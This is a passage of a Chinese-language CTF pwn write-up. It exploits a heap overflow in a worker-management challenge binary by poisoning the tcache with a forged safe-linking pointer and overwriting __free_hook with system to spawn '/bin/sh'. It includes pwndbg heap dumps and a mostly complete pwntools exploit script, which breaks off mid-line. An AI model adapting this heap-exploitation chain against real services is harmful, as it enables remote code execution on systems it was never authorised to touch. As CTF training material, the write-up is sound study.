<p>但本题目提供了一个函数指针来调用 <code>free_hook</code>，因此传统的 <code>free_hook</code> 劫持是可行的</p>
<p><strong>入侵思路</strong></p>
<p>有堆溢出，已经泄露的 libc_base 和 heap_base</p>
<p>最简单的方法就是 tcache attack（因为已知 heap_base 可以伪造 key）</p>
<p>我的第一个思路比较简单：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add_worker(<span class="string">&quot;a&quot;</span>*<span class="number">0xa0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0xa0</span>) <span class="comment"># chunk0(用于泄露heap_base)</span></span><br><span class="line">add_worker(p32(<span class="number">0x11111111</span>),p32(<span class="number">0x11111111</span>)) <span class="comment"># chunk1</span></span><br><span class="line">add_worker(p32(<span class="number">0x22222222</span>),p32(<span class="number">0x22222222</span>)) <span class="comment"># chunk2</span></span><br><span class="line">add_worker(p32(<span class="number">0x33333333</span>),p32(<span class="number">0x33333333</span>)) <span class="comment"># chunk3</span></span><br><span class="line">del_worker(<span class="number">1</span>)</span><br><span class="line">edit_worker(<span class="number">0</span>,p32(<span class="number">0x22222222</span>),payload)</span><br></pre></td></tr></table></figure>
<ul>
<li>释放 chunk2</li>
<li>修改 chunk1，利用堆溢出修改 chunk2-&gt;fd</li>
</ul>
<p>但上述操作在实现的过程中会覆盖一些程序申请的 chunk，而导致报错，所以我们需要利用堆风水让可以溢出的 chunk_target 和已经释放的 chunk_free 相邻</p>
<p>经多次尝试，程序的分配逻辑如下：</p>
<ul>
<li>先申请4个chunk，然后顺序释放前2个chunk</li>
<li>用如下测试案例可以得出结果：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add_worker(<span class="string">&quot;a&quot;</span>*<span class="number">0xa0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0xa0</span>)</span><br><span class="line">add_worker(<span class="string">&quot;b&quot;</span>*<span class="number">0xa0</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0xa0</span>)</span><br><span class="line">add_worker(<span class="string">&quot;c&quot;</span>*<span class="number">0xa0</span>,<span class="string">&quot;c&quot;</span>*<span class="number">0xa0</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xb0</span> [  <span class="number">4</span>]: <span class="number">0x55a9811028e0</span> —▸ <span class="number">0x55a981102830</span> —▸ <span class="number">0x55a981102660</span> —▸ <span class="number">0x55a981102780</span> ◂— <span class="number">0x0</span> </span><br><span class="line"><span class="number">0xb0</span> [  <span class="number">2</span>]: <span class="number">0x559a4cbd5830</span> —▸ <span class="number">0x559a4cbd58e0</span> ◂— <span class="number">0x0</span> </span><br><span class="line"><span class="number">0xb0</span> [  <span class="number">2</span>]: <span class="number">0x55a31a9108e0</span> —▸ <span class="number">0x55a31a910830</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0xb0</span> [  <span class="number">2</span>]: <span class="number">0x5557bbb0f830</span> —▸ <span class="number">0x5557bbb0f8e0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>依照这个逻辑，我们可以先检查一下 <code>8d0 820 650 770</code> 附近的堆风水：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(tcache)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x55916ba96770 <span class="comment">/* chunk0:desc */</span></span></span><br><span class="line"><span class="function">Size: 0xb1</span></span><br><span class="line"><span class="function">fd: 0x55916ba96</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(tcache)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x55916ba96820 <span class="comment">/* 不会被申请 */</span></span></span><br><span class="line"><span class="function">Size: 0xb1</span></span><br><span class="line"><span class="function">fd: 0x559432bfdcf6</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(tcache)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x55916ba968d0 <span class="comment">/* 不会被申请 */</span></span></span><br><span class="line"><span class="function">Size: 0xb1</span></span><br><span class="line"><span class="function">fd: 0x559432bfd2a6</span></span><br></pre></td></tr></table></figure>
<ul>
<li>发现3个连续的同大小的 chunk，很适合用来溢出</li>
<li>攻击测试案例如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add_worker(<span class="string">&quot;a&quot;</span>*<span class="number">0xa0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0xa0</span>) <span class="comment"># 用于获取heap_base</span></span><br><span class="line"></span><br><span class="line">add_worker(p32(<span class="number">0x11111111</span>),p32(<span class="number">0x11111111</span>))</span><br><span class="line">add_worker(p32(<span class="number">0x11111111</span>),p32(<span class="number">0x11111111</span>))</span><br><span class="line">add_worker(p32(<span class="number">0x11111111</span>),p32(<span class="number">0x11111111</span>))</span><br><span class="line">add_worker(p32(<span class="number">0x11111111</span>),p32(<span class="number">0x11111111</span>))</span><br><span class="line"></span><br><span class="line">add_worker(<span class="string">&quot;a&quot;</span>*<span class="number">0xa0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0xa0</span>)</span><br><span class="line">del_worker(<span class="number">0</span>) <span class="comment"># 用于产生3个连续且相同的free chunk</span></span><br><span class="line">add_worker(<span class="string">&quot;a&quot;</span>*<span class="number">0xa0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0xa0</span>) <span class="comment"># 申请4个chunk,释放2个chunk</span></span><br><span class="line">target_addr = ((heap_base + <span class="number">0x10</span>) &gt;&gt; <span class="number">12</span>) ^ (free_hook - <span class="number">0xa8</span>)</span><br><span class="line">payload = <span class="string">&#x27;B&#x27;</span> * <span class="number">0xb0</span> + p64(target_addr)[:<span class="number">6</span>]</span><br><span class="line">edit_worker(<span class="number">0</span>,p32(<span class="number">0x11111111</span>),payload)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x20</span> [  <span class="number">5</span>]: <span class="number">0x55bd79c24ec0</span> —▸ <span class="number">0x55bd79c250a0</span> —▸ <span class="number">0x55bd79c24ee0</span> —▸ <span class="number">0x55bd79c25030</span> —▸ <span class="number">0x55bd79c24c40</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span> [  <span class="number">4</span>]: <span class="number">0x55bd79c24710</span> —▸ <span class="number">0x55bd79c25050</span> —▸ <span class="number">0x55bd79c24e20</span> —▸ <span class="number">0x55bd79c24e70</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0xb0</span> [  <span class="number">2</span>]: <span class="number">0x55bd79c24830</span> —▸ <span class="number">0x7f282fcac400</span> (__timer_compat_list+<span class="number">1984</span>) ◂— <span class="number">0x7f282fcac</span></span><br><span class="line"><span class="number">0xc0</span> [  <span class="number">1</span>]: <span class="number">0x55bd79c250c0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x100</span> [  <span class="number">1</span>]: <span class="number">0x55bd79c24f30</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x170</span> [  <span class="number">1</span>]: <span class="number">0x55bd79c24430</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>成功把 <code>target</code> 放入 <code>tcachebins</code> 中，但是这里并不能直接把 <code>target</code> 取出放入 <code>list</code>（前两个 chunk 会被顺序释放，并且它们不会被放入 <code>list</code>）</li>
<li>解决的的办法很简单，使用 <code>del_worker</code> 释放掉两个 chunk 就可以了</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">del_worker(<span class="number">5</span>)</span><br><span class="line">add_worker(<span class="string">&quot;d&quot;</span>*<span class="number">0xa0</span>,<span class="string">&quot;d&quot;</span>*<span class="number">0xa0</span>)</span><br><span class="line">payload = <span class="string">&#x27;c&#x27;</span>*<span class="number">0xA8</span> + p64(system_libc)[:<span class="number">6</span>]</span><br><span class="line">edit_worker(<span class="number">5</span>,p32(<span class="number">0x11111111</span>),payload) <span class="comment"># 已经成功劫持free_hook</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x20</span> [  <span class="number">3</span>]: <span class="number">0x55ac097510a0</span> —▸ <span class="number">0x55ac09751030</span> —▸ <span class="number">0x55ac09750c40</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span> [  <span class="number">1</span>]: <span class="number">0x55ac097511b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span> [  <span class="number">2</span>]: <span class="number">0x55ac09750e20</span> —▸ <span class="number">0x55ac09750e70</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0xb0</span> [  <span class="number">4</span>]: <span class="number">0x55ac09750d10</span> —▸ <span class="number">0x55ac09750c60</span> —▸ <span class="number">0x55ac09750830</span> —▸ <span class="number">0x7fefc0c74400</span> (__timer_compat_list+<span class="number">1984</span>) ◂— <span class="number">0x7fefc0c74</span></span><br><span class="line"><span class="number">0xc0</span> [  <span class="number">1</span>]: <span class="number">0x55ac097510c0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x100</span> [  <span class="number">1</span>]: <span class="number">0x55ac09750f30</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x170</span> [  <span class="number">1</span>]: <span class="number">0x55ac09750430</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>最后执行一下 <code>exit_s</code> 就可以了</li>
</ul>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-s</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">d = <span class="string">&quot;b*$rebase(0x6B6C)\n&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(p,d)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    size_protocol = <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x27&quot;</span></span><br><span class="line">    cmd = size_protocol + <span class="string">&quot;\x01&quot;</span> + <span class="string">&quot;\x05&quot;</span> </span><br><span class="line">    cmd = cmd.ljust(<span class="number">9</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    p.send(cmd)</span><br><span class="line"></span><br><span class="line">    size_url = <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x20&quot;</span></span><br><span class="line">    ops_cmd = <span class="string">&quot;/login?&quot;</span></span><br><span class="line">    name = <span class="string">&quot;username=&quot;</span> + <span class="string">&quot;111&quot;</span></span><br><span class="line">    pwd = <span class="string">&quot;&amp;password=&quot;</span> + <span class="string">&quot;222&quot;</span></span><br><span class="line">    url = ops_cmd + name + pwd</span><br><span class="line">    protocol = <span class="string">&quot;\x82&quot;</span> + <span class="string">&quot;\x86&quot;</span> + <span class="string">&quot;\x44&quot;</span> + size_url + url</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(protocol)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(url)))</span><br><span class="line">    p.send(protocol)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>():</span></span><br><span class="line">    size_protocol = <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x2e&quot;</span></span><br><span class="line">    cmd = size_protocol + <span class="string">&quot;\x01&quot;</span> + <span class="string">&quot;\x05&quot;</span> </span><br><span class="line">    cmd = cmd.ljust(<span class="number">9</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    p.send(cmd)</span><br><span class="line"> </span><br><span class="line">    size_url = <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x27&quot;</span></span><br><span class="line">    ops_cmd = <span class="string">&quot;/register?&quot;</span></span><br><span class="line">    name = <span class="string">&quot;username=&quot;</span> + <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">    pwd = <span class="string">&quot;&amp;password=&quot;</span> + <span class="string">&quot;444&quot;</span></span><br><span class="line">    url = ops_cmd + name + pwd</span><br><span class="line">    protocol = <span class="string">&quot;\x82&quot;</span> + <span class="string">&quot;\x86&quot;</span> + <span class="string">&quot;\x44&quot;</span> + size_url + url</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(protocol)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(url)))</span><br><span class="line">    p.send(protocol)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>():</span></span><br><span class="line">    size_protocol = <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x0c&quot;</span></span><br><span class="line">    cmd = size_protocol + <span class="string">&quot;\x01&quot;</span> + <span class="string">&quot;\x05&quot;</span> </span><br><span class="line">    cmd = cmd.ljust(<span class="number">9</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    p.send(cmd)</span><br><span class="line"></span><br><span class="line">    size_url = <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x05&quot;</span></span><br><span class="line">    ops_cmd = <span class="string">&quot;/exit&quot;</span></span><br><span class="line">    url = ops_cmd </span><br><span class="line">    protocol = <span class="string">&quot;\x82&quot;</span> + <span class="string">&quot;\x86&quot;</span> + <span class="string">&quot;\x44&quot;</span> + size_url + url</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(protocol)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(url)))</span><br><span class="line">    p.send(protocol)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_worker</span>(<span class="params">name,desc</span>):</span></span><br><span class="line">    size_protocol = <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x16&quot;</span></span><br><span class="line">    cmd = size_protocol + <span class="string">&quot;\x01&quot;</span> + <span class="string">&quot;\x05&quot;</span> </span><br><span class="line">    cmd = cmd.ljust(<span class="number">9</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    p.send(cmd)</span><br><span class="line"></span><br><span class="line">    size_url = <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x0f&quot;</span></span><br><span class="line">    url = <span class="string">&quot;/api/add_worker&quot;</span></span><br><span class="line">    protocol = <span class="string">&quot;\x83&quot;</span> + <span class="string">&quot;\x86&quot;</span> + <span class="string">&quot;\x44&quot;</span> + size_url + url</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(protocol)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(url)))</span><br><span class="line">    p.send(protocol)</span><br><span class="line"></span><br><span class="line">    strs = <span class="string">&#x27;&#123;&quot;name&quot;: &quot;&#x27;</span> + name + <span class="string">&#x27;&quot;,&quot;desc&quot;: &quot;&#x27;</span> + desc + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">    size_strs = <span class="string">&quot;\x00&quot;</span> + p16(<span class="built_in">len</span>(strs))[::-<span class="number">1</span>]</span><br><span class="line">    cmd2 = size_strs + <span class="string">&quot;\x00&quot;</span></span><br><span class="line">    cmd2 = cmd2.ljust(<span class="number">9</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    p.send(cmd2)</span><br><span class="line">    p.send(strs)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_worker</span>(<span class="params">index</span>):</span></span><br><span class="line">    size_protocol = <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x16&quot;</span></span><br><span class="line">    cmd = size_protocol + <span class="string">&quot;\x01&quot;</span> + <span class="string">&quot;\x05&quot;</span> </span><br><span class="line">    cmd = cmd.ljust(<span class="number">9</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    p.send(cmd)</span><br><span class="line"></span><br><span class="line">    size_url = <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x0f&quot;</span></span><br><span class="line">    url = <span class="string">&quot;/api/del_worker&quot;</span></span><br><span class="line">    protocol = <span class="string">&quot;\x83&quot;</span> + <span class="string">&quot;\x86&quot;</span> + <span class="string">&quot;\x44&quot;</span> + size_url + url</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(protocol)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(url)))</span><br><span class="line">    p.send(protocol)</span><br><span class="line"></span><br><span class="line">    strs = &#123;</span><br><span class="line">        <span class="string">&#x27;worker_idx&#x27;</span>:index,</span><br><span class="line">    &#125;</span><br><span class="line">    size_strs = <span class="string">&quot;\x00&quot;</span> + p16(<span class="built_in">len</span>(json.dumps(strs)))[::-<span class="number">1</span>]</span><br><span class="line">    cmd2 = size_strs + <span class="string">&quot;\x00&quot;</span></span><br><span class="line">    cmd2 = cmd2.ljust(<span class="number">9</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    p.send(cmd2)</span><br><span class="line">    p.send(json.dumps(strs))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_worker</span>(<span class="params">index</span>):</span></span><br><span class="line">    size_protocol = <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x17&quot;</span></span><br><span class="line">    cmd = size_protocol + <span class="string">&quot;\x01&quot;</span> + <span class="string">&quot;\x05&quot;</span> </span><br><span class="line">    cmd = cmd.ljust(<span class="number">9</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    p.send(cmd)</span><br><span class="line"></span><br><span class="line">    size_url = <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x10&quot;</span></span><br><span class="line">    url = <span class="string">&quot;/api/show_worker&quot;</span></span><br><span class="line">    protocol = <span class="string">&quot;\x83&quot;</span> + <span class="string">&quot;\x86&quot;</span> + <span class="string">&quot;\x44&quot;</span> + size_url + url</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(protocol)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(url)))</span><br><span class="line">    p.send(protocol)</span><br><span class="line"></span><br><span class="line">    strs = &#123;</span><br><span class="line">        <span class="string">&#x27;worker_idx&#x27;</span>:index,</span><br><span class="line">    &#125;</span><br><span class="line">    size_strs = <span class="string">&quot;\x00&quot;</span> + p16(<span class="built_in">len</span>(json.dumps(strs)))[::-<span class="number">1</span>]</span><br><span class="line">    cmd2 = size_strs + <span class="string">&quot;\x00&quot;</span></span><br><span class="line">    cmd2 = cmd2.ljust(<span class="number">9</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    p.send(cmd2)</span><br><span class="line">    p.send(json.dumps(strs))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_worker</span>(<span class="params">index,name,desc</span>):</span></span><br><span class="line">    size_protocol = <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x17&quot;</span></span><br><span class="line">    cmd = size_protocol + <span class="string">&quot;\x01&quot;</span> + <span class="string">&quot;\x05&quot;</span> </span><br><span class="line">    cmd = cmd.ljust(<span class="number">9</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    p.send(cmd)</span><br><span class="line"></span><br><span class="line">    size_url = <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x10&quot;</span></span><br><span class="line">    url = <span class="string">&quot;/api/edit_worker&quot;</span></span><br><span class="line">    protocol = <span class="string">&quot;\x83&quot;</span> + <span class="string">&quot;\x86&quot;</span> + <span class="string">&quot;\x44&quot;</span> + size_url + url</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(protocol)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(url)))</span><br><span class="line">    p.send(protocol)</span><br><span class="line"></span><br><span class="line">    strs = <span class="string">&#x27;&#123;&quot;worker_idx&quot;: &#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;,&quot;name&quot;: &quot;&#x27;</span> + name + <span class="string">&#x27;&quot;,&quot;desc&quot;: &quot;&#x27;</span> + desc + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">    size_strs = <span class="string">&quot;\x00&quot;</span> + p16(<span class="built_in">len</span>(strs))[::-<span class="number">1</span>]</span><br><span class="line">    cmd2 = size_strs + <span class="string">&quot;\x00&quot;</span></span><br><span class="line">    cmd2 = cmd2.ljust(<span class="number">9</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    p.send(cmd2)</span><br><span class="line">    p.send(strs)</span><br><span class="line"></span><br><span class="line">register()</span><br><span class="line">login()</span><br><span class="line">p.recvuntil(<span class="string">&quot;gift&#x27;: \&quot;&quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\&quot;&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">libc_base = leak_addr - <span class="number">0xc4200</span></span><br><span class="line">system_libc = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">success(<span class="string">&quot;system_libc &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(system_libc))</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">add_worker(<span class="string">&quot;a&quot;</span>*<span class="number">0xa0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0xa0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name_addr\&quot;: \&quot;&quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\&quot;&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">heap_base = leak_addr - <span class="number">0x600</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span 